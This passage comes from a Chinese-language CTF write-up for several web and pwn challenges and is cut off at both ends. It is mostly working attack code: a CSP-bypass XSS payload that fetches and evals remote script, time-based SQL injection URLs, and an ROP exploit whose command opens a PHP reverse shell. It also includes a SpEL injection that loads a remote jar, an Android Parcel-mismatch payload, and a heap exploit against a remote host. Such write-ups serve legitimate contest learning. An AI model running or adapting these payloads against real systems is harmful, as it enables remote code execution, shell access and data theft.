&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_29.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_30.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_31.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_32.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_33.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_34.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_35.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_36.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_37.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_38.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_39.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_40.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_41.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_42.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_43.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_44.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_45.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_46.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_47.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_48.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_49.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_50.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_51.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_52.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_53.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_54.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_55.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_56.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_57.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_58.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_59.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_60.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_61.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_62.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_63.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_64.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_65.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_66.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_67.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src<span class="hljs-string">"</span></code></pre><p>看到这里，心想比赛结束了也就没继续了(工作量太大哭惹</p>
<p>可以看到管理员页面加载了很多img，但是直接会访问500。</p>
<p>很明显它这个意思就是想让我们拿到这些图片，我们得想办法找个能sreenshot的库，参考出题人的<code>html2canvas</code>：<a href="https://github.com/niklasvh/html2canvas，拉一个min出来就够用了">https://github.com/niklasvh/html2canvas，拉一个min出来就够用了</a></p>
<p>本地测试一下min的截图功能没有被阉割，nice
<img src="https://i.loli.net/2020/05/08/cYrIVQqNFBw4pRG.jpg" alt="-w1190"></p>
<p>剩下就是过CSP，self不能直接script引入外源库文件。但可以把png作为js文件加载来用，default-src script-src指定self都可过。之前有个google-jsonp的csp bypass，思路类似都是把自己当作跳板了
<img src="https://i.loli.net/2020/05/08/br9isOGjczD48TW.jpg" alt="-w1377"></p>
<p>把截图内容作为图片再次上传到upload，回调出来的url发到http-log就能读到剩下的flag了。测试一下打本地ok，成功拿到upload的图片
<img src="https://i.loli.net/2020/05/08/N1CPzpcLMbsj3Vy.jpg" alt="-w1430"></p>
<pre class="hljs"><code><span class="hljs-attribute">http</span>://134.175.231.113:8848/passport?image=<span class="hljs-number">%2</span>Fstatic<span class="hljs-number">%2</span>Fhead.jpg&amp;island=aa&amp;fruit=aa&amp;name=url&amp;data=amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzEzNC4xNzUuMjMxLjExMzo4ODQ4L3N0YXRpYy9pbWFnZXMvMDIwYTQ1NDJiZDU5MmQ3MWYwM2MyN2Q3ZjdkOWRlZmQucG5nJykudGhlbihyZXM9PnJlcy50ZXh0KCkpLnRoZW4odHh0PT5ldmFsKHR4dCkp<span class="hljs-number">%27</span><span class="hljs-number">%3</span>b<span class="hljs-number">%0</span>aopen(atob(data))<span class="hljs-number">%3</span>b<span class="hljs-number">%2</span>F<span class="hljs-number">%2</span>F</code></pre><h3 id="mixture"><a class="header-link" href="#mixture"></a>mixture</h3>
<p>首先是一个登录界面，尝试了：</p>
<pre class="hljs"><code>http://<span class="hljs-number">49.51</span>.<span class="hljs-number">251.99</span>/member.php?orderby=limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(1,1)</span>;</span></code></pre><p>发现会提取最大最小值，证明这个地方写法如下：</p>
<pre class="hljs"><code><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> id + $_GET[‘orderby’] </code></pre><pre class="hljs"><code><span class="hljs-attribute">http</span>://134.175.185.244/member.php?orderby=,ISNULL(CASE<span class="hljs-number">%20</span>WHEN<span class="hljs-number">%20</span>(1=1)<span class="hljs-number">%20</span>THEN<span class="hljs-number">%20</span>BENCHMARK(2000000,SHA1(123))<span class="hljs-number">%20</span>ELSE<span class="hljs-number">%202</span><span class="hljs-number">%20</span>END)</code></pre><p>利用benchmark延时注入可以得到，库名：
Information_schema,mysql,performance_schema,sys,test
表名
member,users
字段
member: id,username,password
users: id,username,money
爆破密码：
18a960a3a0b3554b314ebe77fe545c85
Md5解密goodlucktoyou</p>
<p class="img-container"><img src="https://i.imgur.com/WAClYCc.png" alt=""></p>
<p>在select.php里面可以任意读取其他php的源码，发现在select.php里面有一个函数Minclude</p>
<p>admin.php里面暴露了phpinfo()
了解到这是一个出题人自己写的扩展，扩展位置在</p>
<pre class="hljs"><code>/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">php</span>/<span class="hljs-title">extensions</span>/<span class="hljs-title">no</span>-<span class="hljs-title">debug</span>-<span class="hljs-title">non</span>-<span class="hljs-title">zts</span>-20170718/<span class="hljs-title">Minclude</span>.<span class="hljs-title">so</span></span></code></pre><p>使用curl命令</p>
<pre class="hljs"><code>curl -O "http://134.175.185.244/select.php<span class="hljs-string">" -H "</span>Cookie:PHPSESSID=<span class="hljs-number">1</span>n26be800cjbdtdcto54u2aj2r<span class="hljs-string">" -d "</span><span class="hljs-keyword">search</span>=/usr/<span class="hljs-keyword">local</span>/lib/php/extensions/<span class="hljs-keyword">no</span>-debug-non-zts<span class="hljs-number">-20170718</span>/Minclude.so&amp;submit=submit<span class="hljs-string">"</span></code></pre><p>下载带有Minclude.so源码的网页，放入Winhex，从elf头7f 45 4c 46开始截取到末尾，获得完整的Minclude.so十六进制文件。</p>
<p>任意读之后，拿到 <code>Minclude.so</code> 需要利用其中的栈溢出，可以任意读出 maps 从而获取到地址，然后就是 rop 了。 rop 过程中发现栈上有两个地址被覆盖了，所以用 pop pop 跳过两个地址不用。</p>
<pre class="hljs"><code><span class="hljs-comment">#encoding:utf-8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *

s = requests.Session()

headers= {
    <span class="hljs-comment">#"Cookie":"PHPSESSID=tkk1enrrlfrtn96baeigf4queo"</span>
    <span class="hljs-string">"Cookie"</span>:<span class="hljs-string">"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"</span>
}
php_base = <span class="hljs-number">0x7f546c3f7000</span>
libc_base = <span class="hljs-number">0x7f546eacb000</span>
minclude_base = <span class="hljs-number">0x7f546d84a000</span>


<span class="hljs-comment">#filename = "index.php" #Here input filename you want to read</span>
INITIAL = <span class="hljs-number">1526</span> - <span class="hljs-number">9</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> INITIAL, php_base, minclude_base, libc_base
    <span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:
        print(<span class="hljs-string">'usage: {} path'</span>.format(sys.argv[<span class="hljs-number">0</span>]))
        <span class="hljs-keyword">return</span>

    exp = <span class="hljs-keyword">False</span>
    debug = <span class="hljs-keyword">False</span>
    filename = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-comment">#Here input filename you want to read</span>
    <span class="hljs-keyword">if</span> filename == <span class="hljs-string">'exp'</span> <span class="hljs-keyword">or</span> filename == <span class="hljs-string">'debug'</span>:
        <span class="hljs-keyword">if</span> filename == <span class="hljs-string">'debug'</span>:
            debug = <span class="hljs-keyword">True</span>
            php_base = <span class="hljs-number">0x7f40b6ec3000</span>
            minclude_base = <span class="hljs-number">0x7f40b6eba000</span>
            libc_base = <span class="hljs-number">0x7f40b7fa0000</span>
        orig_ret = <span class="hljs-number">0x7f546d151ac0</span>
        pop_rdi = php_base + <span class="hljs-number">0x000000000014b260</span> <span class="hljs-comment"># pop rdi ; ret </span>
        php_info = <span class="hljs-number">0x47bd10</span> - <span class="hljs-number">0x100000</span> + php_base
        ret = php_base + <span class="hljs-number">0x14b261</span>
        jmp_rdi = php_base + <span class="hljs-number">0x000000000019f729</span> <span class="hljs-comment"># jmp rdi</span>
        <span class="hljs-keyword">if</span> debug:
            mov_to_rdi = <span class="hljs-number">0x00000000000494ea</span> + libc_base <span class="hljs-comment"># mov qword ptr [rdi], rsi ; ret</span>
        <span class="hljs-keyword">else</span>:
            mov_to_rdi = <span class="hljs-number">0x00000000000494e5</span> + libc_base <span class="hljs-comment"># mov eax, 1 ; mov qword ptr [rdi], rsi ; ret</span>
        pop_pop = <span class="hljs-number">0x000000000000135e</span> + minclude_base <span class="hljs-comment"># pop rbp ; pop r12 ; ret</span>
        pop_rsi = <span class="hljs-number">0x000000000002440e</span> + libc_base <span class="hljs-comment"># pop rsi ; ret</span>
        exp = <span class="hljs-keyword">True</span>


        system = libc_base + <span class="hljs-number">0x449c0</span>
        halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi)
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span><span class="hljs-params">(addr, val)</span>:</span>
            <span class="hljs-keyword">assert</span> len(val) == <span class="hljs-number">8</span>
            <span class="hljs-keyword">return</span> p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi)
        area = minclude_base + <span class="hljs-number">0x4000</span>
        cmd = <span class="hljs-string">b"php -r '$sock=fsockopen(\"X.X.X.X\",52333);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"</span>
        cur = <span class="hljs-number">0</span>
        rop = <span class="hljs-string">b''</span>
        buf = cmd[:<span class="hljs-number">8</span>]
        rop += write(area, buf)
        cur += <span class="hljs-number">8</span>
        buf = cmd[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>]
        rop += write(area + <span class="hljs-number">8</span>, buf)
        cur += <span class="hljs-number">8</span>
        rop += p64(pop_pop)
        rop += p64(<span class="hljs-number">0xdeadbeef</span>)
        rop += p64(<span class="hljs-number">0xdeadbeef</span>)

        <span class="hljs-keyword">while</span> cur &lt; len(cmd):
            buf = cmd[cur: cur+<span class="hljs-number">8</span>]
            <span class="hljs-keyword">if</span> len(buf) != <span class="hljs-number">8</span>:
                buf = buf.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\0'</span>)
            rop += write(area + cur, buf)
            cur += <span class="hljs-number">8</span>

        rop += p64(pop_rdi)
        rop += p64(area)
        rop += p64(system)
        rop += halt
        filename = <span class="hljs-string">b'a'</span> * (<span class="hljs-number">0x88</span>) + rop
    INITIAL += len(filename)



    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">3</span>:
        save_filename = sys.argv[<span class="hljs-number">2</span>]
    <span class="hljs-keyword">else</span>:
        save_filename = os.path.basename(filename)
    data = {
        <span class="hljs-string">"search"</span>:filename,
        <span class="hljs-string">"submit"</span>:<span class="hljs-string">"submit"</span>
    }

    <span class="hljs-comment">#url = "http://134.175.185.244/select.php"</span>
    <span class="hljs-keyword">if</span> debug:
        url = <span class="hljs-string">"http://localhost:51111/select.php"</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment">#url = "http://49.51.251.99/select.php"</span>
        url = <span class="hljs-string">"http://134.175.185.244/select.php"</span>
    r = requests.post(url, data=data, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exp:
        f = open(save_filename, <span class="hljs-string">"wb"</span>)
        f.write(r.content[INITIAL:])
        f.close()
    <span class="hljs-keyword">else</span>:
        print(r.content)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre><p>两个服务器的 php 好像都不一样，所以只能打一个服务器。</p>
<h3 id="calc"><a class="header-link" href="#calc"></a>calc</h3>
<p>URLClassloader能过，服务器上放jar static块执行命令，远程加载下jar就行。</p>
<pre class="hljs"><code>nEw<span class="hljs-symbol">%20</span>java.net.URLClassLoader(nEw<span class="hljs-symbol">%20</span>java.net.URL<span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%20</span><span class="hljs-symbol">%7</span>BnEw<span class="hljs-symbol">%20</span>java.net.URL(<span class="hljs-symbol">%22</span>http<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%2</span>F<span class="hljs-symbol">%2</span>F<span class="hljs-number">139.199</span>.<span class="hljs-keyword">x</span><span class="hljs-symbol">%3</span>A<span class="hljs-number">3333</span><span class="hljs-symbol">%2</span>Flfy.jar<span class="hljs-symbol">%22</span>)<span class="hljs-symbol">%7</span>D).loadClass(<span class="hljs-symbol">%22</span>ws<span class="hljs-symbol">%22</span>).getMethods()<span class="hljs-symbol">%5</span>B<span class="hljs-number">0</span><span class="hljs-symbol">%5</span>D.<span class="hljs-keyword">invoke</span>(<span class="hljs-keyword">null</span>)
</code></pre><p>第二种方法：直接利用Classloader也可以打通,python发送</p>
<pre class="hljs"><code>T\x00(java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>).getSystemClassLoader().loadClass(<span class="hljs-string">"java.nio.file.Files"</span>).readAllLines(T\x00(java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLClassLoader</span>).getSystemClassLoader().loadClass(<span class="hljs-string">"java.nio.file.Paths"</span>).get(<span class="hljs-string">"/flag"</span>))</code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
<h3 id="broadcasttest"><a class="header-link" href="#broadcasttest"></a>BroadcastTest</h3>
<p>逆向APK可知程序中仅有MainActivity$Message和三个Receiver类。
前者实现了一个Parcelable类，后三个则是广播。
其中Receiver1是export的，接收并向Receiver2发送广播，Receiver2和3则非export，只能接收内部发送的广播。
功能为Receiver1接收base64传入的data，然后将其反序列化得到一个Bundle，再广播给Receiver2。
Receiver2检查Bundle中“command”存在且值非&quot;getflag&quot;，然后再次发送广播给Receiver3。
Receiver3检查Bundle中&quot;command&quot;存在且值为&quot;getflag&quot;，通过则回显正确。</p>
<p>简单搜索可以找到这篇<a href="https://www.ms509.com/2018/07/03/bundle-mismatch/">文章</a>，描述了Parcel中对于读出和写入时类型不一致会产生的漏洞。
查看本题中Message类也是相同的，有两处不一致，分别是</p>
<pre class="hljs"><code><span class="hljs-keyword">this</span>.txRate = <span class="hljs-keyword">in</span>.readInt();
dest.writeByte((byte) <span class="hljs-keyword">this</span>.txRate);</code></pre><p>和</p>
<pre class="hljs"><code><span class="hljs-keyword">this</span>.rttSpread = <span class="hljs-keyword">in</span>.readLong();
dest.writeInt((int) <span class="hljs-keyword">this</span>.rttSpread);</code></pre><p>这会导致每次读写覆盖后4字节。注意Bundle内部序列化时是4字节对齐的，因此int和byte的类型不一致没有用。<br>本题的目的是在读写一次以后产生一个新的键值对&quot;command=getflag&quot;，与文章中暴露恶意Intent的思路基本一致。  </p>
<p>Bundle中的map存储顺序是<code>Key长度, Key内容, Value类型, Value长度, Value内容</code></p>
<p>因此思考一下可以构造出如下payload：</p>
<table>
<thead>
<tr>
<th>Message</th>
<th>len_key</th>
<th>content_key</th>
<th>type_value</th>
<th>len_value</th>
<th>content_value</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>pad</td>
<td>16 00 00 00</td>
<td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>03 00 00 00</td>
<td>&quot;pad&quot;</td>
<td></td>
</tr>
<tr>
<td>pad 16 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot; 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;getflag&quot; 00 00</td>
</tr>
</tbody>
</table>
<p>这里的String长度是2字节一个单位，应该是UTF-16格式，因此fake_key的长度是<code>(4+(7+1)*2+4+4+(7+1)*2)/2</code>，注意4字节对齐因此command后要手动补0。</p>
<p>即原来content_key中的内容扩展成一个键值对暴露出来使得Receiver3可见而Receiver2不可见。
完整构造代码如下：</p>
<pre class="hljs"><code>        Parcel a = Parcel.obtain();
        Parcel b = Parcel.obtain();
        a.writeInt(<span class="hljs-number">3</span>);<span class="hljs-comment">//Count</span>
        a.writeString(<span class="hljs-string">"mismatch"</span>);
        a.writeInt(<span class="hljs-number">4</span>);<span class="hljs-comment">//Parcable</span>
        a.writeString(<span class="hljs-string">"com.de1ta.broadcasttest.MainActivity$Message"</span>);
        a.writeString(<span class="hljs-string">"bssid"</span>);
        a.writeInt(<span class="hljs-number">1</span>);
        a.writeInt(<span class="hljs-number">2</span>);
        a.writeInt(<span class="hljs-number">3</span>);
        a.writeInt(<span class="hljs-number">4</span>);
        a.writeInt(<span class="hljs-number">5</span>);
        a.writeInt(<span class="hljs-number">6</span>);
        a.writeInt(<span class="hljs-number">7</span>);
        a.writeLong(<span class="hljs-number">8</span>);
        a.writeInt(<span class="hljs-number">9</span>);
        a.writeInt(<span class="hljs-number">10</span>);
        a.writeInt(-<span class="hljs-number">1</span>);<span class="hljs-comment">//int to byte, txRate</span>
        a.writeLong(<span class="hljs-number">11</span>);
        a.writeLong(<span class="hljs-number">12</span>);
        a.writeLong(<span class="hljs-number">0x11223344</span>);
        <span class="hljs-comment">// fake key commandxxxgetflag</span>
        a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag\0"</span>);
        a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
        a.writeString(<span class="hljs-string">"1"</span>);<span class="hljs-comment">//fake_value</span>
        a.writeString(<span class="hljs-string">"command"</span>);<span class="hljs-comment">//for bundle.getString("command")!=null</span>
        a.writeInt(<span class="hljs-number">0</span>);
        a.writeString(<span class="hljs-string">"gotflag"</span>);
        <span class="hljs-keyword">int</span> len = a.dataSize();
        b.writeInt(len);
        b.writeInt(<span class="hljs-number">0x4c444E42</span>);
        b.appendFrom(a, <span class="hljs-number">0</span>, len);
        b.setDataPosition(<span class="hljs-number">0</span>);

        <span class="hljs-keyword">byte</span>[] raw = b.marshall();
        String output = Base64.encodeToString(raw, <span class="hljs-number">0</span>);
        Log.i(<span class="hljs-string">"test"</span>, output);</code></pre><h3 id="stl_container"><a class="header-link" href="#stl_container"></a>stl_container</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
r=remote(<span class="hljs-string">"134.175.239.26"</span>,<span class="hljs-string">"8848"</span>)

libc = ELF(<span class="hljs-string">"./libc-2.27.so"</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmenu</span><span class="hljs-params">(idx)</span>:</span>
    r.sendlineafter(<span class="hljs-string">"&gt;&gt; "</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(typ,data)</span>:</span>
    mmenu(str(typ))
    mmenu(<span class="hljs-number">1</span>)
    r.sendafter(<span class="hljs-string">"input data:"</span>,data)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(typ,idx)</span>:</span>
    mmenu(str(typ))
    mmenu(<span class="hljs-number">2</span>)
    <span class="hljs-keyword">if</span> typ&lt;<span class="hljs-number">3</span>:
        r.sendlineafter(<span class="hljs-string">"index?"</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(typ,idx)</span>:</span>
    mmenu(str(typ))
    mmenu(<span class="hljs-number">3</span>)
    r.sendlineafter(<span class="hljs-string">"index?"</span>,str(idx))

add(<span class="hljs-number">2</span>,<span class="hljs-string">'aaa'</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-string">'ccc'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):
    <span class="hljs-keyword">if</span> i != <span class="hljs-number">2</span>:
        add(i,<span class="hljs-string">'a'</span>)
        add(i,<span class="hljs-string">'a'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):
    <span class="hljs-keyword">if</span> i != <span class="hljs-number">2</span>:
        free(i,<span class="hljs-number">1</span>)
        free(i,<span class="hljs-number">0</span>)

free(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)
show(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)
r.recvuntil(<span class="hljs-string">"data: "</span>)
libc.address = u64(r.recvline()[:<span class="hljs-number">-1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-number">-0x3ebca0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>):
    <span class="hljs-keyword">if</span> i != <span class="hljs-number">2</span>:
        add(i,<span class="hljs-string">'a'</span>)
        add(i,<span class="hljs-string">'/bin/sh\x00'</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-string">'ccc'</span>)
free(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)
free(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)
add(<span class="hljs-number">2</span>,p64(libc.sym[<span class="hljs-string">'__free_hook'</span>]))
add(<span class="hljs-number">1</span>,p64(libc.sym[<span class="hljs-string">'system'</span>]))
free(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)
free(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)

r.interactive()</code></pre><h3 id="code_runner"><a class="header-link" href="#code_runner"></a>code_runner</h3>
<p>找pattern，针对每个 pattern 写解决方案就好了</p>
<pre class="hljs"><code><span class="hljs-keyword">use</span> pyo3::prelude::*;
<span class="hljs-keyword">use</span> pyo3::wrap_pyfunction;
<span class="hljs-keyword">use</span> std::{
    io::{
        <span class="hljs-keyword">self</span>, Read, Seek, SeekFrom, Cursor, BufReader,
    },
};

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_bne</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x14</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x15</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x16</span> || buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x17</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_mult</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">3</span>] &lt;= <span class="hljs-number">3</span> &amp;&amp; buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x18</span> &amp;&amp; buf[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_lbu</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x90</span>
    <span class="hljs-comment">//buf[1] == 0x00 &amp;&amp; buf[3] == 0x90 &amp;&amp; (buf[2] == 0x42 || buf[2] == 0x43 || buf[2] == 0x44)</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">addiu_val</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-built_in">Option</span>&lt;<span class="hljs-keyword">u8</span>&gt; {
    <span class="hljs-keyword">if</span> buf[<span class="hljs-number">3</span>] &gt;= <span class="hljs-number">0x24</span> &amp;&amp; buf[<span class="hljs-number">3</span>] &lt;= <span class="hljs-number">0x27</span> {
        <span class="hljs-literal">Some</span>(buf[<span class="hljs-number">0</span>])
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-literal">None</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_addu</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
    buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x21</span> &amp;&amp;
        buf[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0b111</span> == <span class="hljs-number">0</span> &amp;&amp;
        buf[<span class="hljs-number">3</span>] &lt;= <span class="hljs-number">3</span>
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">li_val</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-built_in">Option</span>&lt;u16&gt; {
    <span class="hljs-keyword">if</span> buf[<span class="hljs-number">2</span>] == <span class="hljs-number">0x02</span> &amp;&amp; buf[<span class="hljs-number">3</span>] == <span class="hljs-number">0x24</span> {
        <span class="hljs-literal">Some</span>(buf[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> u16 * <span class="hljs-number">0x100</span> + buf[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> u16)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-literal">None</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_andi</span></span>(buf: &amp;[<span class="hljs-keyword">u8</span>]) -&gt; <span class="hljs-keyword">bool</span> {
